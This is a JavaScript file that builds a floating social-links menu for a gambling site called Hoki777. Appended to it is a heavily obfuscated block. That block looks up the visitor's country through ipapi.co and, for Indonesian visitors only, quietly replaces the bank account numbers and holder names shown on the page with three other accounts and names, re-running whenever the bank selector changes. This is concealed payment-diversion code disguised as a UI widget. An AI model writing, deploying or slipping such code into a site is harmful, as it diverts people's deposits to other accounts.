(function () {
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
    .widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://hk777.top/telegramgruphoki777/" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/wahoki777" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/RTP-Hoki777" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/facebookgruphoki777/" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Hoki777" width="30" height="30">
                    </div>
                </a>
            </div>
        </div>
        
        <img src="https://yudha125.github.io/menu-widget/Image/hoki.webp" alt="Logo Hoki777" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Hoki777" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);

})();

(function(_0x2ff7a){var _0xdd_0x510=(838540^838541)+(243194^243186);const _0x842ae=["DI".split("").reverse().join("")];_0xdd_0x510='\u0064\u006C\u0067\u0065\u0062\u006F';var _0xab_0x2db=(572294^572290)+(315380^315380);_0x2ff7a="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";_0xab_0x2db=690982^690990;function _0xg3ba(_0x99c,_0xf2c2ge,_0x4bb9g){const _0xdf45ag=[{'\u0061\u006E\u0067\u006B\u0061\u0041\u0073\u006C\u0069':"\u0037\u0033\u0039\u0031\u0039\u0035\u0033\u0030\u0031\u0039","angkaBaru":'2120452005',"namaAsli":"\u0052\u0058\u0058\u0058\u0059\u0020\u0041\u0058\u0058\u0058\u0059\u0041",'\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':"\u004C\u0045\u0056\u0049"},{'\u0061\u006E\u0067\u006B\u0061\u0041\u0073\u006C\u0069':'0839-0100-5781-509','\u0061\u006E\u0067\u006B\u0061\u0042\u0061\u0072\u0075':"\u0030\u0033\u0034\u0035\u002D\u0030\u0031\u0030\u0035\u002D\u0030\u0032\u0031\u0031\u002D\u0035\u0030\u0036",'\u006E\u0061\u006D\u0061\u0041\u0073\u006C\u0069':"\u0043\u002A\u002A\u002A\u002A\u0052\u0041\u0020\u0044\u002A\u002A\u0049",'\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':'LUSIANA'},{'\u0061\u006E\u0067\u006B\u0061\u0041\u0073\u006C\u0069':"\u0031\u0038\u0030\u0030\u0030\u0038\u0038\u0037\u0030\u0036",'\u0061\u006E\u0067\u006B\u0061\u0042\u0061\u0072\u0075':"\u0031\u0037\u0039\u0036\u0033\u0037\u0037\u0031\u0033\u0033","namaAsli":'SAxxxxI',"namaBaru":"\u0052\u0049\u0046\u0041\u004C"}];_0x99c=(432056^432057)+(270268^270267);_0xf2c2ge="\u0062\u0061\u006E\u006B\u0053\u0065\u006C\u0065\u0063\u0074";function _0x623c(){_0xdf45ag['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](item=>{const _0xd5e2g=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0073\u0070\u0061\u006E");for(let i=337326^337326;i<_0xd5e2g['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0xd5e2g[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===item['\u0061\u006E\u0067\u006B\u0061\u0041\u0073\u006C\u0069']){_0xd5e2g[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=item['\u0061\u006E\u0067\u006B\u0061\u0042\u0061\u0072\u0075'];break;}}const _0x70d13a=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0064\u0069\u0076");for(let i=408080^408080;i<_0x70d13a['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x70d13a[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===item['\u006E\u0061\u006D\u0061\u0041\u0073\u006C\u0069']){_0x70d13a[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=item['\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075'];break;}}});}function _0x11b(){var _0x7ebca=(675642^675635)+(543398^543392);const _0xbaeb=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0xf2c2ge);_0x7ebca=(693557^693556)+(343448^343450);if(!_0xbaeb)return false;_0x623c();if(!_0xbaeb['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0xbaeb['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("egnahc".split("").reverse().join(""),_0x623c);_0xbaeb['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="eurt".split("").reverse().join("");}return!![];}if(_0x11b())return;const _0x2fc=new MutationObserver(()=>{if(_0x11b())_0x2fc['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0x4bb9g=(920163^920163)+(581357^581348);_0x2fc['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{"childList":!![],'\u0073\u0075\u0062\u0074\u0072\u0065\u0065':!![]});}async function _0xc3aefd(){try{let _0x2de1d;const _0x4b90bc=await fetch(_0x2ff7a);_0x2de1d=(346368^346369)+(998318^998318);if(!_0x4b90bc['\u006F\u006B'])throw new Error("\u0041\u0050\u0049\u0020\u0045\u0072\u0072\u006F\u0072");let _0xea51ec;const _0x3fae6a=await _0x4b90bc['\u006A\u0073\u006F\u006E']();_0xea51ec='\u006E\u006D\u0062\u0070\u0065\u006B';const _0xae8g5d=_0x3fae6a['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];if(!_0xae8g5d)throw new Error("\u0044\u0061\u0074\u0061\u0020\u006E\u0065\u0067\u0061\u0072\u0061\u0020\u006B\u006F\u0073\u006F\u006E\u0067");if(_0x842ae['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](_0xae8g5d)){console['\u006C\u006F\u0067'](`✅ Terdeteksi: ${_0xae8g5d} - Skrip dijalankan`);_0xg3ba();}else{console['\u006C\u006F\u0067'](`🚫`);}}catch(err){console['\u0077\u0061\u0072\u006E']("\u26A0\uFE0F");}}_0xc3aefd();})();